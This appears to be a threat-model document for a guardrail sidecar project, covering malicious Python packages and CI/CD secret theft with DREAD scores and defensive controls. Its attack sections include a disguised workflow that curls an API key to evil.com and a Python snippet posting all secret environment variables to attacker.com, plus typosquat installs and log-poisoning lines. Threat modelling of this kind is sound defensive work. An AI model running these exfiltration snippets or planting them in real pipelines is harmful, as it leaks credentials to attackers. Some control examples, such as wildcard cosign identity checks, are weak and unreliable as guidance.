# Supply Chain Security Threats
<!-- cid-supply-chain-threats -->

## Overview
Modern AI systems depend on complex supply chains including PyPI packages, container images, and CI/CD pipelines. These dependencies create attack surfaces that can compromise the entire security posture.

## Threat Catalog

### SC-1: Malicious Python Package Injection
**Category**: Dependency Compromise  
**DREAD Score**: 6.6/10 (High)  
**Jira**: [PS-61](https://jira.promptstrike.ai/PS-61)  
**Owner**: DevSecOps Team  
**Due**: 2024-01-12

#### DREAD Breakdown
- **Damage**: 8 (Full sidecar compromise)
- **Reproducibility**: 8 (Automated attacks)
- **Exploitability**: 7 (Easy with typos)
- **Affected Users**: 4 (Build-time impact)
- **Discoverability**: 6 (Scanning tools exist)

#### Description
Compromised PyPI packages in sidecar dependencies can lead to complete container compromise, data exfiltration, and supply chain attacks.

#### Attack Scenarios

##### 1. Typosquatting
```bash
# Legitimate package
pip install pydantic

# Malicious typosquat
pip install pydnatic  # Missing 'a'
pip install pydantic-core-evil  # Added suffix
```

##### 2. Dependency Confusion
```python
# Internal package in private repo
internal-promptstrike-utils==1.0.0

# Malicious public package with higher version
pip install internal-promptstrike-utils==2.0.0  # From PyPI
```

##### 3. Maintainer Compromise
```python
# Legitimate package gets backdoored
fastapi==0.104.2  # Original
fastapi==0.104.3  # Compromised update
```

#### Real-World Impact
- **SolarWinds-style**: Complete environment access
- **Data Exfiltration**: API keys, secrets theft
- **Lateral Movement**: Compromise other services
- **Persistence**: Backdoors in container images

#### Detection Methods
```python
# Dependency risk analysis
class SupplyChainScanner:
    def __init__(self):
        self.typosquat_db = self._load_typosquat_patterns()
        self.malware_signatures = self._load_signatures()
        
    def scan_requirements(self, requirements_file: str) -> List[Threat]:
        """Scan requirements.txt for supply chain threats"""
        threats = []
        
        with open(requirements_file) as f:
            for line in f:
                package = self._parse_package(line)
                
                # Typosquatting detection
                if self._is_typosquat(package.name):
                    threats.append(Threat(
                        type="typosquat",
                        package=package.name,
                        risk="high",
                        suggestion=self._suggest_correct_package(package.name)
                    ))
                
                # Version analysis
                if self._is_suspicious_version(package):
                    threats.append(Threat(
                        type="suspicious_version",
                        package=package.name,
                        risk="medium"
                    ))
                    
        return threats
```

#### Mitigation Strategies

##### Hash Verification
```bash
# requirements.txt with hashes
fastapi==0.104.1 \
    --hash=sha256:abc123...def456 \
    --hash=sha256:789ghi...jkl012
    
pydantic==2.5.1 \
    --hash=sha256:mno345...pqr678

# Install with verification
pip install --require-hashes -r requirements.txt
```

##### Dependency Scanning CI
```yaml
# .github/workflows/supply-chain-security.yml
name: supply-chain-security
on: [pull_request]

jobs:
  dependency-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Install with hash verification
        run: |
          pip install --require-hashes -r guardrail_poc/sidecar/requirements.txt
          
      - name: Trivy SBOM scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: 'guardrail_poc/sidecar'
          format: 'sarif'
          output: 'trivy-results.sarif'
          
      - name: Safety vulnerability scan
        run: |
          pip install safety
          safety check --json --output safety-report.json
          
      - name: Cosign container verification
        run: |
          cosign verify \
            --certificate-identity-regexp ".*" \
            --certificate-oidc-issuer-regexp ".*" \
            ghcr.io/promptstrike/guardrail-sidecar:latest
            
    # Compliance: SOC2 CC6.1 (Logical Access Controls)
```

##### SBOM Generation
```dockerfile
# Multi-stage build with SBOM
FROM python:3.11-slim as builder

# Generate SBOM
RUN pip install pip-licenses
COPY requirements.txt .
RUN pip install -r requirements.txt && \
    pip-licenses --format json --output-file /sbom.json

FROM python:3.11-slim as runtime
COPY --from=builder /sbom.json /app/sbom.json
# Include SBOM in final image
```

---

### SC-2: CI/CD Secret Exfiltration
**Category**: Credential Theft  
**DREAD Score**: 6.4/10 (High)  
**Jira**: [PS-62](https://jira.promptstrike.ai/PS-62)  
**Owner**: CI/CD Security Team  
**Due**: 2024-01-18

#### DREAD Breakdown
- **Damage**: 9 (Full credential compromise)
- **Reproducibility**: 5 (Requires CI access)
- **Exploitability**: 6 (PR-based attacks)
- **Affected Users**: 7 (Production impact)
- **Discoverability**: 5 (Audit required)

#### Description
Secrets leaked through CI/CD pipeline compromise, including API keys, database credentials, and signing certificates.

#### Attack Vectors

##### 1. Malicious Workflow Injection
```yaml
# Malicious .github/workflows/exfiltrate.yml
name: innocent-test
on: [pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Run tests
        run: |
          echo "Running tests..."
          # Secretly exfiltrate secrets
          curl -X POST https://evil.com/collect \
            -d "secrets=${{ secrets.OPENAI_API_KEY }}"
```

##### 2. Log Poisoning
```bash
# Inject secrets into logs
echo "Debug: API_KEY=$OPENAI_API_KEY" >> build.log
echo "Config: DB_PASSWORD=$DATABASE_PASSWORD" >> deployment.log

# Logs get stored in CI system and accessible to attackers
```

##### 3. Build Artifact Tampering
```python
# Malicious step in CI
import os
import requests

# Exfiltrate all environment variables
secrets = {k: v for k, v in os.environ.items() if 'KEY' in k or 'PASSWORD' in k}
requests.post('https://attacker.com/collect', json=secrets)
```

#### Prevention Controls

##### Secret Scanning
```yaml
# .github/workflows/secret-scan.yml
name: secret-scanning
on: [push, pull_request]

jobs:
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history
          
      - name: GitLeaks scan
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          
      - name: TruffleHog scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: main
          head: HEAD
```

##### Least Privilege CI
```yaml
# Restricted CI permissions
permissions:
  contents: read        # No write access
  pull-requests: read   # No comment access
  secrets: none         # No secret access (where possible)
  
# Use specific secrets only where needed
steps:
  - name: Deploy to staging
    if: github.ref == 'refs/heads/main'
    env:
      DEPLOY_KEY: ${{ secrets.STAGING_DEPLOY_KEY }}  # Specific key
    run: |
      # Deployment logic
```

##### Secret Rotation
```python
# Automated secret rotation
class SecretRotator:
    def __init__(self, vault_client):
        self.vault = vault_client
        
    def rotate_api_keys(self):
        """Rotate all API keys on schedule"""
        keys_to_rotate = [
            'OPENAI_API_KEY',
            'ANTHROPIC_API_KEY', 
            'DATABASE_PASSWORD'
        ]
        
        for key_name in keys_to_rotate:
            old_key = self.vault.get_secret(key_name)
            new_key = self.generate_new_key(key_name)
            
            # Update in vault
            self.vault.put_secret(key_name, new_key)
            
            # Update in CI/CD
            self.update_github_secret(key_name, new_key)
            
            # Revoke old key after grace period
            self.schedule_revocation(old_key, delay_hours=24)
```

## Supply Chain Security Controls

### Package Management
```yaml
# Approved package registry
package_sources:
  primary: "https://pypi.org/simple/"
  fallback: "https://internal-pypi.promptstrike.ai/"
  
security_policies:
  - require_hash_verification: true
  - block_known_malicious: true
  - scan_for_vulnerabilities: true
  - license_compliance_check: true
```

### Container Security
```bash
# Container scanning pipeline
#!/bin/bash

# Build container
docker build -t guardrail-sidecar:latest .

# Scan for vulnerabilities
trivy image --severity HIGH,CRITICAL guardrail-sidecar:latest

# Verify base image
cosign verify docker.io/library/python:3.11-slim

# Generate attestation
cosign attest --predicate sbom.json guardrail-sidecar:latest
```

### Monitoring & Detection
```python
# Supply chain monitoring
class SupplyChainMonitor:
    def monitor_dependencies(self):
        """Continuous monitoring of supply chain"""
        
        # Check for new vulnerabilities
        self.scan_for_cves()
        
        # Monitor package updates
        self.check_package_integrity()
        
        # Validate signatures
        self.verify_package_signatures()
        
        # Alert on anomalies
        self.detect_anomalous_behavior()
```

## See Also
- [Risk Matrix](06-risk-matrix.md#supply-chain-risks) - Supply chain risk priorities
- [Mitigations](07-mitigations.md#supply-chain-controls) - Implementation guides
- [Incident Response](09-incident-response.md#supply-chain-incidents) - Response procedures
- [Back to Index](README.md)